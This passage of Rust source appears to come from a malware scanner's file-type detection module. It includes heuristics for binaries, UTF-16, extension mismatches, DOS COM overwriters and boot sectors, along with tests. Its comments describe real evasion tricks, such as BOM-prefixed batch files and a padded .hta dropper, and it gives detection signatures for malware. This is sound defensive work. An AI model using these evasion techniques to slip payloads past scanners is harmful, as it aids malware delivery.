        .filter(|&&b| (b < 0x20 && !matches!(b, b'\t' | b'\n' | b'\r')) || b == 0x7F)
        .count();
    control * 100 > head.len() * MAX_CONTROL_PERCENT
        && (head.len() >= 64 || control >= MIN_CONTROL_SHORT)
}

/// Object code wearing a source extension (a DOS COM named `Burger.m` or
/// `Trivial.45.t`). UTF-16 text is mostly NULs and would otherwise look the
/// same; a BOM or a lane of NULs keeps that as text for the extension fallback.
pub(crate) fn binary_not_source(data: &[u8]) -> bool {
    let body = strip_utf8_bom(data);
    let head = &body[..body.len().min(SCAN_LIMIT)];
    looks_like_binary(head) && !looks_like_utf16_text(head)
}

/// UTF-16 text, which the byte-oriented scorer cannot read. Content cannot
/// judge it, so the extension stays the word on it.
pub(crate) fn is_utf16_text(data: &[u8]) -> bool {
    looks_like_utf16_text(&data[..data.len().min(SCAN_LIMIT)])
}

fn looks_like_utf16_text(head: &[u8]) -> bool {
    head.starts_with(&[0xFF, 0xFE])
        || head.starts_with(&[0xFE, 0xFF])
        || utf16_lanes(head).is_some()
}

/// The byte order of UTF-16 text without a byte-order mark: `Some(true)` for
/// little-endian, whose ASCII leaves the odd bytes NUL.
fn utf16_lanes(head: &[u8]) -> Option<bool> {
    if head.len() < 64 {
        return None;
    }
    let pairs = head.len() / 2;
    let nul_even = head.iter().step_by(2).filter(|&&b| b == 0).count();
    let nul_odd = head.iter().skip(1).step_by(2).filter(|&&b| b == 0).count();
    // One lane of NULs beside a lane of characters. A zero-filled header
    // (an Access database, a boot sector's padding) is NUL in both lanes and
    // is not text -- it used to pass as UTF-16 and keep a `.c` name.
    let mostly = |n: usize| n * 5 > pairs * 4;
    let sparse = |n: usize| n * 5 < pairs;
    if mostly(nul_odd) && sparse(nul_even) {
        Some(true)
    } else if mostly(nul_even) && sparse(nul_odd) {
        Some(false)
    } else {
        None
    }
}

/// The text the scorers should read instead of `data`, when that differs:
/// UTF-16 narrowed to UTF-8, or a UTF-16 byte-order mark dropped from the
/// 8-bit text behind it. The mark in front of plain ASCII is a batch trick --
/// editors render the script as CJK, and cmd.exe runs it anyway.
pub(crate) fn decoded_text(data: &[u8]) -> Option<Cow<'_, [u8]>> {
    // UTF-16 spells a line of ASCII with a NUL in every other byte; text
    // without a byte-order mark or an early NUL is not UTF-16.
    if !matches!(data, [0xFF, 0xFE, ..] | [0xFE, 0xFF, ..])
        && memchr::memchr(0, &data[..data.len().min(64)]).is_none()
    {
        return None;
    }
    let (bom, body) = match data {
        [0xFF, 0xFE, rest @ ..] => (Some(true), rest),
        [0xFE, 0xFF, rest @ ..] => (Some(false), rest),
        _ => (None, data),
    };
    let probe = &body[..body.len().min(SCAN_LIMIT)];
    // UTF-16 spells ASCII with every other byte NUL. 8-bit text behind the
    // mark has next to none -- a stray one at the end is not an encoding.
    let nuls = probe.iter().filter(|&&b| b == 0).count();
    let little_endian = match (bom, utf16_lanes(probe)) {
        (_, Some(le)) => le,
        (Some(_), None) if nuls * 10 < probe.len() => return Some(Cow::Borrowed(body)),
        (Some(le), None) => le,
        (None, None) => return None,
    };
    let body = &body[..body.len().min(DECODE_LIMIT)];
    let units = body.as_chunks::<2>().0.iter().map(|pair| {
        if little_endian {
            u16::from_le_bytes([pair[0], pair[1]])
        } else {
            u16::from_be_bytes([pair[0], pair[1]])
        }
    });
    let text: String = char::decode_utf16(units)
        .map(|c| c.unwrap_or(char::REPLACEMENT_CHARACTER))
        .collect();
    Some(Cow::Owned(text.into_bytes()))
}

/// Whether the body carries any scored token of `ft`'s language. `false` for a
/// language the table does not score.
pub(crate) fn has_language_evidence(ft: FileType, data: &[u8]) -> bool {
    let Some(lang) = Lang::from_file_type(ft) else {
        return false;
    };
    let body = data.trim_ascii_start();
    scan_scores(&body[..body.len().min(SCAN_LIMIT)])[lang.idx()] > 0
}

/// C statement structure: statements ended with `;` alongside braces, a C
/// comment, or a preprocessor line. Objective-C is a superset of C, so a `.m`
/// holding plain C (`int main(...) { GoFunc(); }`) is still what its name says;
/// a MATLAB script, a hosts file, or a batch file under the same letter is not.
pub(crate) fn looks_like_c_family(data: &[u8]) -> bool {
    let head = &data[..data.len().min(SCAN_LIMIT)];
    let statement_end = head
        .split(|&b| b == b'\n')
        .any(|line| line.trim_ascii_end().ends_with(b";"));
    statement_end
        && (head.contains(&b'{')
            || contains(head, b"/*")
            || contains(head, b"//")
            || head
                .split(|&b| b == b'\n')
                .any(|l| l.trim_ascii_start().first() == Some(&b'#')))
}

/// Content that contradicts a source-language extension, and what it is
/// instead. The extension is the last word, not the first: `Trojan.BAT.Looper.t`
/// is a batch file whatever Perl's `.t` says, and `Exploit.JS.RealPlr.ko` is a
/// page. Three ways to be contradicted:
///
/// * the line grammars read batch, VBScript, mIRC or ircII plainly and find
///   no line of the claimed language -- a `.vbs` that is obfuscated batch, a
///   `.bat` that is VBScript, a `.mrc` holding an ircII script;
/// * the body opens as markup, which no source language (bar the template
///   ones, which stay with their extension) begins with;
/// * the scorer names batch or VBScript outright and finds not one token of
///   the claimed language. Only those two: their conclusive tokens (`@echo`,
///   `WScript.`) occur nowhere else, while a weaker win -- JavaScript over an
///   nmap `.lua` library, Kotlin over a venv's `Activate.ps1` -- is the token
///   fight the extension exists to settle. A claimed language the table does
///   not score cannot be judged this way, so its extension stands.
pub(crate) fn contradicts_extension(ext: FileType, data: &[u8]) -> Option<FileType> {
    // Template languages open with markup by design, and Scala has XML
    // literals; their extensions stand.
    if matches!(
        ext,
        FileType::Php
            | FileType::Asp
            | FileType::Jsp
            | FileType::Cfml
            | FileType::Html
            | FileType::Scala
    ) {
        return None;
    }
    let text = decoded_text(data).unwrap_or(Cow::Borrowed(data));
    let body = strip_utf8_bom(&text).trim_ascii_start();
    // Ahead of the markup check: a batch file may open `<!-- :` to double as
    // the WSF or HTA it carries further down. This runs on every source file
    // with a name, so it reads less than a nameless file gets.
    let script = scripts::evidence_within(body, CONTRADICTION_WINDOW);
    if let Some(found) = script.verdict() {
        let scores = scan_scores(&body[..body.len().min(SCAN_LIMIT)]);
        let claimed = Lang::from_file_type(ext);
        if found == ext || script.supports(ext) || claimed.is_some_and(|l| scores[l.idx()] > 0) {
            return None;
        }
        // The name stands unless the body outweighs it. One command line does
        // not: `msiexec /i URL` is as much PowerShell as batch. A name whose
        // language nothing here reads (Elixir, Go) cannot be shown absent, so
        // only a run of lines overrides it -- `@echo off` alone is also an
        // Elixir module attribute.
        let tokens_agree = claimed.is_some()
            && Lang::from_file_type(found).is_some_and(|l| scores[l.idx()] >= THRESHOLD);
        return (script.conclusive(found) || tokens_agree).then_some(found);
    }
    if body.first() == Some(&b'<') && looks_like_html(&text) {
        return Some(FileType::Html);
    }
    let claimed = Lang::from_file_type(ext)?;
    // Only batch or VBScript can contradict a name this way, and the scorer
    // names neither without its tokens in the head. Most source files stop
    // here instead of being scored in full.
    let head = &body[..body.len().min(SCAN_LIMIT)];
    let scores = scan_scores(head);
    if scores[Lang::Batch.idx()] < THRESHOLD && scores[Lang::Vbs.idx()] < THRESHOLD {
        return None;
    }
    let found = detect_from_content(data)?;
    if found == ext || !matches!(found, FileType::Batch | FileType::Vbs) {
        return None;
    }
    (scores[claimed.idx()] == 0).then_some(found)
}

/// True when `head` reads like natural-language text rather than source.
///
/// Measured on the first 4 KiB: prose (novels, licenses) has 0.15-0.3% code
/// punctuation with ~4% of lines carrying any; minified JS 6.5% / 93%, Rust
/// 3.5% / 58%, a Makefile 4.1% / 91%, and even a Markdown README with embedded
/// snippets 2.8% / 30%. Both thresholds sit well inside that gap, and both must
/// hold — a file has to look like prose on the byte *and* the line axis.
fn looks_like_prose(head: &[u8]) -> bool {
    if head.is_empty() {
        return false;
    }
    let punct = head.iter().filter(|&&b| is_code_punct(b)).count();
    let mut lines = 0usize;
    let mut code_lines = 0usize;
    for line in head.split(|&b| b == b'\n') {
        if line.iter().all(u8::is_ascii_whitespace) {
            continue;
        }
        lines += 1;
        if line.iter().any(|&b| is_code_punct(b)) {
            code_lines += 1;
        }
    }
    if lines == 0 {
        return false;
    }
    punct * 100 < head.len() && code_lines * 100 < lines * 15
}

/// `true` when the bytes read as a structured-data document — a JSON object or
/// array, or a YAML block mapping — rather than as code in any scored language.
/// Kept deliberately shape-based: it asks how the lines are built, never which
/// words they contain, so a rule file is data no matter which language's tokens
/// it quotes.
fn looks_like_structured_data(data: &[u8]) -> bool {
    let head = &data[..data.len().min(SCAN_LIMIT)];
    // A shebang names an interpreter: that is a script, whatever follows.
    if head.starts_with(b"#!") {
        return false;
    }
    let body = head.trim_ascii_start();
    // JSON: opens a container and carries at least one quoted key.
    if (body.starts_with(b"{") || body.starts_with(b"["))
        && memchr::memmem::find(body, b"\":").is_some()
    {
        return true;
    }
    // YAML: block mappings and sequence entries dominate the significant lines.
    // A trailing partial line from the scan cut is dropped rather than judged.
    let mut lines = head.split(|&b| b == b'\n').peekable();
    let mut significant = 0usize;
    let mut structured = 0usize;
    while let Some(line) = lines.next() {
        if lines.peek().is_none() && head.len() == SCAN_LIMIT {
            break;
        }
        let line = line.trim_ascii();
        if line.is_empty() || line.starts_with(b"#") {
            continue;
        }
        significant += 1;
        if is_yaml_node_line(line) {
            structured += 1;
        }
    }
    if significant >= MIN_YAML_LINES && structured * 10 >= significant * 7 {
        return true;
    }

    looks_like_rfc822_stanzas(head)
}

/// `true` for an RFC822/deb822 stanza document: `Field-Name: value` lines whose
/// continuations are folded onto following lines that begin with a space.
///
/// Debian's `control`, APT's `Packages`/`Sources` and its `Translation-*`
/// description catalogues are all this shape, and the folded continuations are
/// free English prose -- which is why the YAML check above cannot see them: a
/// wrapped sentence is not a node line, so the ratio collapses even though
/// every field line is structured. APT's `Translation-en` is 32 MB of package
/// descriptions, and "This package contains…" occurring six times in the first
/// 4 KB was enough to type the whole catalogue as Kotlin and run credential
/// rules over English sentences.
fn looks_like_rfc822_stanzas(head: &[u8]) -> bool {
    let mut lines = head.split(|&b| b == b'\n').peekable();
    let mut fields = 0usize;
    let mut folded = 0usize;
    let mut other = 0usize;
    let mut first_significant_is_field = false;
    let mut seen_significant = false;

    while let Some(line) = lines.next() {
        // Drop the trailing partial line left by the scan cut rather than judge it.
        if lines.peek().is_none() && head.len() == SCAN_LIMIT {
            break;
        }
        if line.trim_ascii().is_empty() {
            continue;
        }
        // A folded continuation belongs to the field above it, so it is not
        // evidence either way -- but it only counts as one after a field.
        if matches!(line.first(), Some(b' ' | b'\t')) {
            if fields > 0 {
                folded += 1;
                continue;
            }
            other += 1;
            continue;
        }
        let is_field = is_rfc822_field_line(line);
        if !seen_significant {
            seen_significant = true;
            first_significant_is_field = is_field;
        }
        if is_field {
            fields += 1;
        } else {
            other += 1;
        }
    }

    // Every unfolded line must be a field, the document must open with one, and
    // there must be enough of them to be a stanza rather than a stray `Note:`.
    first_significant_is_field && other == 0 && fields >= MIN_YAML_LINES && folded > 0
}

/// `true` for `Field-Name: value` with an RFC822 field name -- printable ASCII
/// without spaces or a colon. Rejects a Kotlin `package a.b` (no colon), a C
/// label (no value) and a prose line containing a mid-sentence colon.
fn is_rfc822_field_line(line: &[u8]) -> bool {
    let end = match line.iter().position(|&b| b == b':') {
        Some(0) | None => return false,
        Some(i) => i,
    };
    if !line[..end]
        .iter()
        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_' | b'.'))
    {
        return false;
    }
    matches!(line.get(end + 1), None | Some(b' ') | Some(b'\r'))
}

/// `true` for a line that opens a YAML sequence entry, a block mapping key, or
/// a document marker. Keys are matched by shape (`name:` followed by end of line
/// or a space), which is what separates `regex: \$_POST` from PHP's `$_POST`.
fn is_yaml_node_line(line: &[u8]) -> bool {
    if line == b"---" || line == b"..." || line.starts_with(b"--- ") {
        return true;
    }
    if line == b"-" || line.starts_with(b"- ") {
        return true;
    }
    // A sequence entry may carry its first mapping key: `- id: value`.
    let key = line.strip_prefix(b"- ").unwrap_or(line).trim_ascii_start();
    let end = key
        .iter()
        .position(|b| !matches!(b, b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'_' | b'-' | b'.' | b'/' | b'"' | b'\''))
        .unwrap_or(key.len());
    end > 0 && key.get(end) == Some(&b':') && matches!(key.get(end + 1), None | Some(b' '))
}

/// `true` when the first instruction of the document is `FROM` or `ARG`, the
/// only two a Dockerfile may open with. Comments, blank lines, and a leading
/// parser directive are skipped, matching what the builder accepts.
fn starts_with_dockerfile_instruction(data: &[u8]) -> bool {
    for line in data[..data.len().min(SCAN_LIMIT)].split(|&b| b == b'\n') {
        let line = line.trim_ascii();
        if line.is_empty() || line.starts_with(b"#") {
            continue;
        }
        let word_end = line
            .iter()
            .position(u8::is_ascii_whitespace)
            .unwrap_or(line.len());
        return line[..word_end].eq_ignore_ascii_case(b"FROM")
            || line[..word_end].eq_ignore_ascii_case(b"ARG");
    }
    false
}

/// `true` when the bytes carry a PHP tag delimiter — an opening `<?`, `<?php`,
/// or `<?=`, or the `?>` that closes a fragment whose opening tag was cut off.
/// `<?xml …?>` is an XML processing instruction and never counts on its own.
fn has_php_tag(data: &[u8]) -> bool {
    let mut saw_xml_pi = false;
    let mut offset = 0;
    while let Some(pos) = memchr::memmem::find(&data[offset..], b"<?") {
        let after = offset + pos + 2;
        if data[after..].len() >= 3 && data[after..after + 3].eq_ignore_ascii_case(b"xml") {
            saw_xml_pi = true;
        } else {
            return true;
        }
        offset = after;
    }
    !saw_xml_pi && memchr::memmem::find(data, b"?>").is_some()
}

/// How far into a file [`looks_like_html`] will look for markup.
///
/// The only caller reaches this after the *extension* has already claimed an
/// HTML type, so the question is "does the content corroborate the name", not
/// "what is this file". A short prefix answers that badly: padding the front of
/// the file is then all it takes to be classified Unknown, and an Unknown file
/// matches no trait at all, since every trait declares the types it targets.
///
/// That is a real evasion, not a hypothetical. An `.hta` dropper was observed
/// opening with `try {` and roughly 275 KB of `;` before its first `<html>` --
/// well past any reasonable sniffing prefix, and classified Unknown because of
/// it. One megabyte is far enough to see through that while still bounding the
/// scan on a large file.
const HTML_SCAN_WINDOW: usize = 1 << 20;

/// Tags that only markup carries. Static like [`SCANNER`]'s patterns, so a
/// build failure is a bug here: it panics rather than calling nothing HTML.
static HTML_AC: LazyLock<AhoCorasick> = LazyLock::new(|| {
    AhoCorasick::builder()
        .ascii_case_insensitive(true)
        .build([
            "<!doctype html",
            "<html",
            "<head",
            "<body",
            "<script",
            "<div",
            "<span",
            "<p>",
            "<meta",
        ])
        .expect("HTML tags are a valid Aho-Corasick set")
});

/// Check if content looks like HTML (has actual markup tags).
pub(crate) fn looks_like_html(data: &[u8]) -> bool {
    HTML_AC.is_match(&data[..data.len().min(HTML_SCAN_WINDOW)])
}

/// A mark that belongs to one format and almost nothing else.
///
/// Checked against a short prefix, in order, case-folded where the format
/// itself is. This is not the language scorer: a weighted token fight is how
/// a JSP page became Python and a mIRC script became Lua. One needle, one type.
pub(crate) fn unmistakable(data: &[u8]) -> Option<FileType> {
    let data = strip_utf8_bom(data);
    let head = &data[..data.len().min(2048)];
    if looks_like_git_config(head) {
        return Some(FileType::Text);
    }
    // Manual pages are troff input, not source code. Roff's short requests
    // (for example `.B`, `.I`, and `.PP`) collide with source-language
    // tokens, so recognize a page title together with several distinct
    // requests before the language scorer can mistake prose for JavaScript.
    if looks_like_roff_man_page(head) {
        return Some(FileType::Text);
    }
    // Makefile fragments often have no canonical basename, and media-like
    // suffixes are used for library-specific include fragments (for example,
    // `makefile.jpeg` and `makefile.png`). Strong make syntax in the bytes is
    // more reliable than that suffix; a valid media signature has already
    // won in magic::detect_from_content before this heuristic runs.
    if looks_like_makefile(head) {
        return Some(FileType::Makefile);
    }
    // Ace ships JSP snippets as a JavaScript AMD module. Its snippet strings
    // contain many JSP page directives, so recognize the wrapper before those
    // embedded examples can make a snippet catalog look like a server page.
    if contains_ci(head, b"define(\"ace/snippets/") && contains_ci(head, b"exports.snippetText") {
        return Some(FileType::JavaScript);
    }
    // `<%@ Page Language="C#"` is ASP.NET. `<%@ page` / `<%@page` otherwise
    // is JSP. Classic ASP is `<%@ Language` with no `page` word. The ASP
    // forms have to win, or the shared `<%@ page` prefix swallows them.
    if looks_like_asp_directive(head) {
        return Some(FileType::Asp);
    }
    if contains_ci(head, b"<%@page")
        || contains_ci(head, b"<%@ page")
        || contains(head, b"<jsp:root")
        || contains(head, b"<jsp:directive.page")
    {
        return Some(FileType::Jsp);
    }
    if contains_ci(head, b"<cfset")
        || contains_ci(head, b"<cfoutput")
        || contains_ci(head, b"<cfscript")
        || contains_ci(head, b"<cfquery")
        || contains_ci(head, b"<cfparam")
    {
        return Some(FileType::Cfml);
    }
    if let Some(irc) = scripts::irc_mark(&data[..data.len().min(4096)]) {
        return Some(irc);
    }
    if contains(head, b"\\documentclass")
        || contains(head, b"\\NeedsTeXFormat")
        || contains(head, b"\\ProvidesClass")
        || contains(head, b"\\ProvidesPackage")
    {
        return Some(FileType::Tex);
    }
    if looks_like_yara(head) {
        return Some(FileType::Yara);
    }
    None
}

/// Recognize Git's config syntax from a bounded prefix. `.git/config` has no
/// extension and content is its only reliable identity; content must also win
/// over a misleading filename such as `Makefile` or `settings.py`.
pub(crate) fn looks_like_git_config(data: &[u8]) -> bool {
    #[derive(Clone, Copy, PartialEq, Eq)]
    enum Section {
        Core,
        Remote,
        Branch,
        Filter,
        User,
        Other,
    }

    let data = strip_utf8_bom(data);
    let head = &data[..data.len().min(SCAN_LIMIT)];
    if head.is_empty() || looks_like_binary(head) {
        return false;
    }

    let mut section = Section::Other;
    let mut recognized_section = false;
    let mut recognized_key = false;
    let mut meaningful_lines = 0usize;
    let mut config_lines = 0usize;

    for raw_line in head.split(|&byte| byte == b'\n') {
        let line = raw_line.trim_ascii();
        if line.is_empty() || line.starts_with(b"#") || line.starts_with(b";") {
            continue;
        }
        meaningful_lines += 1;

        if line.starts_with(b"[") && line.ends_with(b"]") {
            let name = &line[1..line.len() - 1];
            section = if name.eq_ignore_ascii_case(b"core") {
                recognized_section = true;
                Section::Core
            } else if git_config_subsection(name, b"remote") {
                recognized_section = true;
                Section::Remote
            } else if git_config_subsection(name, b"branch") {
                recognized_section = true;
                Section::Branch
            } else if git_config_subsection(name, b"filter") {
                recognized_section = true;
                Section::Filter
            } else if name.eq_ignore_ascii_case(b"user") {
                recognized_section = true;
                Section::User
            } else {
                Section::Other
            };
            config_lines += 1;
            continue;
        }

        let Some(equal) = line.iter().position(|&byte| byte == b'=') else {
            continue;
        };
        let key = line[..equal].trim_ascii();
        if key.is_empty()
            || !key
                .iter()
                .all(|byte| byte.is_ascii_alphanumeric() || matches!(*byte, b'-' | b'.'))
        {
            continue;
        }
        config_lines += 1;
        let known = match section {
            Section::Core => [
                b"repositoryformatversion".as_slice(),
                b"filemode",
                b"bare",
                b"logallrefupdates",
                b"ignorecase",
                b"precomposeunicode",
                b"symlinks",
                b"worktree",
                b"fsmonitor",
                b"hookspath",
                b"excludesfile",
            ]
            .iter()
            .any(|candidate| key.eq_ignore_ascii_case(candidate)),
            Section::Remote => [
                b"url".as_slice(),
                b"fetch",
                b"pushurl",
                b"mirror",
                b"tagopt",
            ]
            .iter()
            .any(|candidate| key.eq_ignore_ascii_case(candidate)),
            Section::Branch => [b"remote".as_slice(), b"merge", b"rebase", b"pushremote"]
                .iter()
                .any(|candidate| key.eq_ignore_ascii_case(candidate)),
            Section::Filter => [b"clean".as_slice(), b"smudge", b"process", b"required"]
                .iter()
                .any(|candidate| key.eq_ignore_ascii_case(candidate)),
            Section::User => [b"name".as_slice(), b"email", b"signingkey"]
                .iter()
                .any(|candidate| key.eq_ignore_ascii_case(candidate)),
            Section::Other => false,
        };
        recognized_key |= known;
    }

    recognized_section
        && recognized_key
        && meaningful_lines >= 2
        && config_lines * 10 >= meaningful_lines * 9
}

fn git_config_subsection(header: &[u8], name: &[u8]) -> bool {
    let Some(rest) = header.get(name.len()..) else {
        return false;
    };
    header[..name.len()].eq_ignore_ascii_case(name)
        && rest.starts_with(b" \"")
        && rest.len() > 3
        && rest.ends_with(b"\"")
}

/// Recognize traditional `man` pages by their title request and a varied set
/// of formatting requests. A single `.TH` or `.SH` line in code or prose is
/// too weak; distinct requests make the roff document structure explicit.
fn looks_like_roff_man_page(head: &[u8]) -> bool {
    const REQUESTS: [&[u8]; 19] = [
        b"TH", b"SH", b"SS", b"PP", b"LP", b"P", b"TP", b"IP", b"B", b"I", b"BR", b"BI", b"RB",
        b"IR", b"nf", b"fi", b"de", b"ds", b"sp",
    ];

    let mut seen = [false; REQUESTS.len()];
    let mut distinct = 0usize;
    let mut has_title = false;

    for line in head.split(|byte| *byte == b'\n') {
        let line = line.strip_suffix(b"\r").unwrap_or(line);
        let Some((&control, rest)) = line.split_first() else {
            continue;
        };
        if control != b'.' && control != b'\'' {
            continue;
        }
        let end = rest
            .iter()
            .position(u8::is_ascii_whitespace)
            .unwrap_or(rest.len());
        let request = &rest[..end];
        if request == b"TH" {
            has_title = true;
        }
        if let Some(index) = REQUESTS.iter().position(|known| *known == request) {
            if !seen[index] {
                seen[index] = true;
                distinct += 1;
            }
        }
    }

    has_title && distinct >= 5
}

/// Recognize compact Makefile fragments from independent make-language
/// structures. The assignment plus `$(shell ...)` form covers
/// library-specific include fragments; a target followed by a tab-indented
/// recipe covers ordinary build files.
fn looks_like_makefile(head: &[u8]) -> bool {
    let mut assignments = 0usize;
    let mut shell_functions = 0usize;
    let mut include_directives = 0usize;
    let mut has_target = false;
    let mut has_recipe = false;

    for line in head.split(|&byte| byte == b'\n') {
        let trimmed = line.trim_ascii();
        if trimmed.is_empty() || trimmed.starts_with(b"#") {
            continue;
        }
        if line.starts_with(b"\t") {
            has_recipe = true;
        }
        if trimmed.starts_with(b"include ") || trimmed.starts_with(b"-include ") {
            include_directives += 1;
        }
        if trimmed.windows(8).any(|window| window == b"$(shell ") {
            shell_functions += 1;
        }

        let operators = [
            b"?=".as_slice(),
            b":=".as_slice(),
            b"+=".as_slice(),
            b"=".as_slice(),
        ];
        if let Some(index) = operators
            .iter()
            .find_map(|operator| trimmed.windows(operator.len()).position(|w| w == *operator))
        {
            let name = trimmed[..index].trim_ascii_end();
            if !name.is_empty()
                && name
                    .iter()
                    .all(|byte| byte.is_ascii_alphanumeric() || *byte == b'_')
            {
                assignments += 1;
            }
        } else if line == trimmed && !trimmed.starts_with(b"//") {
            // Make target definitions start in column zero. Requiring that
            // also prevents indented source comments such as `//post:` from
            // combining with unrelated tab-indented code into a false match.
            let Some(colon) = trimmed.iter().position(|&byte| byte == b':') else {
                continue;
            };
            let target = &trimmed[..colon];
            if !target.is_empty() && !target.iter().any(u8::is_ascii_whitespace) {
                has_target = true;
            }
        }
    }

    (assignments >= 2 && (shell_functions > 0 || include_directives > 0))
        || (has_target && has_recipe)
}

/// DOS COM has no header. A visible `CD 21` is strong evidence.
pub(crate) fn looks_like_dos_com(data: &[u8]) -> bool {
    if data.len() > DOS_COM_MAX_SIZE {
        return false;
    }
    let head = &data[..data.len().min(4096)];
    head.windows(2).any(|w| w == [0xCD, 0x21])
}

/// Recognize a standalone FAT12/16/32 volume boot sector. Require the BIOS
/// jump, 0x55AA boot signature, and mutually plausible BPB fields; the final
/// two bytes alone are common in unrelated 512-byte data and are not enough.
pub(crate) fn looks_like_fat_boot_sector(data: &[u8]) -> bool {
    if data.len() < 512
        || data[510..512] != [0x55, 0xAA]
        || !matches!(data[0], 0xE9 | 0xEB)
        || (data[0] == 0xEB && data[2] != 0x90)
    {
        return false;
    }

    let bytes_per_sector = u16::from_le_bytes([data[11], data[12]]);
    let sectors_per_cluster = data[13];
    let reserved_sectors = u16::from_le_bytes([data[14], data[15]]);
    let fat_count = data[16];
    let total_sectors_16 = u16::from_le_bytes([data[19], data[20]]);
    let media = data[21];
    let fat_size_16 = u16::from_le_bytes([data[22], data[23]]);
    let sectors_per_track = u16::from_le_bytes([data[24], data[25]]);
    let heads = u16::from_le_bytes([data[26], data[27]]);
    let total_sectors_32 = u32::from_le_bytes([data[32], data[33], data[34], data[35]]);
    let fat_size_32 = u32::from_le_bytes([data[36], data[37], data[38], data[39]]);

    let valid_sector_size = matches!(bytes_per_sector, 512 | 1024 | 2048 | 4096);
    let valid_cluster_size = sectors_per_cluster.is_power_of_two() && sectors_per_cluster <= 128;
    let valid_media = media == 0xF0 || media >= 0xF8;
    let has_fat_size = fat_size_16 != 0 || fat_size_32 != 0;
    let has_volume_size = total_sectors_16 != 0 || total_sectors_32 != 0;

    valid_sector_size
        && valid_cluster_size
        && reserved_sectors != 0
        && (1..=4).contains(&fat_count)
        && valid_media
        && has_fat_size
        && has_volume_size
        && (1..=63).contains(&sectors_per_track)
        && heads != 0
}

/// A headerless binary with no telling name that is still shaped like a DOS
/// COM program. A single `CD 21` is too common in arbitrary binary metadata,
/// so unnamed files need an adjacent DOS service selector or a complete
/// overwriter shape before we assign an executable type.
pub(crate) fn looks_like_unnamed_dos_com(data: &[u8]) -> bool {
    data.len() >= 16
        && data.len() <= DOS_COM_MAX_SIZE
        && ((binary_not_source(data) && has_dos_service_call(data))
            || looks_like_dos_com_overwriter(data))
}

/// A short DOS overwriter may be mostly zero-padded, so the general binary
/// classifier can treat its bytes as text-like. Require its complete small
/// execution shape before overriding that result: repeated DOS interrupts,
/// DOS termination, and a COM wildcard in the code/data prefix.
fn looks_like_dos_com_overwriter(data: &[u8]) -> bool {
    if !(64..=DOS_COM_MAX_SIZE).contains(&data.len()) {
        return false;
    }
    let prefix = &data[..data.len().min(256)];
    let dos_calls = prefix.windows(2).filter(|w| *w == [0xCD, 0x21]).count();
    dos_calls >= 2
        && prefix.windows(2).any(|w| w == [0xCD, 0x20])
        && contains_ci(prefix, b"*.com\0")
}

fn has_dos_service_call(data: &[u8]) -> bool {
    data.windows(4)
        .any(|w| w[0] == 0xB4 && w[2..] == [0xCD, 0x21])
        || data
            .windows(5)
            .any(|w| w[0] == 0xB8 && w[3..] == [0xCD, 0x21])
}

fn looks_like_asp_directive(head: &[u8]) -> bool {
    // Classic ASP's own directives. `<%@codepage=936%>` opens a good share of
    // the Chinese-language webshells.
    let mut from = 0;
    while let Some(at) = find_ci(&head[from..], b"<%@") {
        let rest = head[from + at + 3..].trim_ascii_start();
        let directive = [
            &b"language"[..],
            b"codepage",
            b"enablesessionstate",
            b"lcid",
            b"transaction",
        ]
        .iter()
        .any(|d| rest.len() >= d.len() && rest[..d.len()].eq_ignore_ascii_case(d));
        if directive {
            return true;
        }
        from += at + 3;
    }
    let page = contains_ci(head, b"<%@page") || contains_ci(head, b"<%@ page");
    page && (contains_ci(head, b"language=\"c#\"")
        || contains_ci(head, b"language=\"vb\"")
        || contains_ci(head, b"language=\"jscript\"")
        || contains_ci(head, b"language='c#'")
        || contains_ci(head, b"language='vb'")
        || contains_ci(head, b"language='jscript'"))
}

/// `rule <name>` plus both section labels. YARA keywords are lowercase;
/// requiring all three keeps an English sentence that says "rule" from matching.
fn looks_like_yara(head: &[u8]) -> bool {
    let rule = head.split(|&b| b == b'\n').any(|line| {
        let line = line.trim_ascii_start();
        line.starts_with(b"rule ")
            || line.starts_with(b"private rule ")
            || line.starts_with(b"global rule ")
    });
    rule && contains(head, b"strings:") && contains(head, b"condition:")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn fat12_boot_sector() -> [u8; 512] {
        let mut data = [0u8; 512];
        data[..3].copy_from_slice(&[0xEB, 0x3C, 0x90]);
        data[3..11].copy_from_slice(b"MSDOS5.0");
        data[11..13].copy_from_slice(&512u16.to_le_bytes());
        data[13] = 1;
        data[14..16].copy_from_slice(&1u16.to_le_bytes());
        data[16] = 2;
        data[17..19].copy_from_slice(&224u16.to_le_bytes());
        data[19..21].copy_from_slice(&2880u16.to_le_bytes());
        data[21] = 0xF0;
        data[22..24].copy_from_slice(&9u16.to_le_bytes());
        data[24..26].copy_from_slice(&18u16.to_le_bytes());
        data[26..28].copy_from_slice(&2u16.to_le_bytes());
        data[510..].copy_from_slice(&[0x55, 0xAA]);
        data
    }

    fn fat32_boot_sector() -> [u8; 512] {
        let mut data = [0u8; 512];
        data[..3].copy_from_slice(&[0xEB, 0x58, 0x90]);
        data[3..11].copy_from_slice(b"MSWIN4.1");
        data[11..13].copy_from_slice(&512u16.to_le_bytes());
        data[13] = 8;
        data[14..16].copy_from_slice(&32u16.to_le_bytes());
        data[16] = 2;
        data[21] = 0xF8;
        data[24..26].copy_from_slice(&63u16.to_le_bytes());
        data[26..28].copy_from_slice(&255u16.to_le_bytes());
        data[32..36].copy_from_slice(&1_000_000u32.to_le_bytes());
        data[36..40].copy_from_slice(&976u32.to_le_bytes());
        data[510..].copy_from_slice(&[0x55, 0xAA]);
        data
    }

    #[test]
    fn padded_dos_com_overwriter_is_recognized_without_loose_interrupt_matches() {
        const ANTON: &[u8] = include_bytes!("../../testdata/dos-com/anton-97");
        assert!(looks_like_dos_com_overwriter(ANTON));

        let mut one_interrupt = vec![0u8; 5120];
        one_interrupt[0..6].copy_from_slice(b"*.COM\0");
        one_interrupt[16..18].copy_from_slice(&[0xCD, 0x21]);
        one_interrupt[32..34].copy_from_slice(&[0xCD, 0x20]);
        assert!(!looks_like_dos_com_overwriter(&one_interrupt));

        let mut no_wildcard = one_interrupt.clone();
        no_wildcard[24..26].copy_from_slice(&[0xCD, 0x21]);
        no_wildcard[0..6].copy_from_slice(b"plain\0");
        assert!(!looks_like_dos_com_overwriter(&no_wildcard));

        let text = b"uses INT 21 and INT 20 while searching *.COM\n";
        assert!(!looks_like_dos_com_overwriter(text));
    }

    #[test]
    fn fat_boot_sector_accepts_valid_fat12_and_fat32_bpbs() {
        let sector = fat12_boot_sector();
        assert!(looks_like_fat_boot_sector(&sector));
        assert!(looks_like_fat_boot_sector(&fat32_boot_sector()));
    }

